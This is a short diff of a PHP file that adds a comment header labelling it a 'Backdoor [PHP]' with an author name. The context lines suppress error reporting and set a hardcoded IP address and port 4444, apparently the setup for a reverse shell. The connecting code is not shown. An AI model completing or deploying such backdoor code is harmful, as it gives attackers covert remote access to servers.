@@ -1,4 +1,9 @@
 <?php
+
+        /*
+		Backdoor [PHP]
+		Pablo Santhus
+	*/
 	error_reporting(0);
 	$ip = '192.168.0.103';
 	$port = 4444;
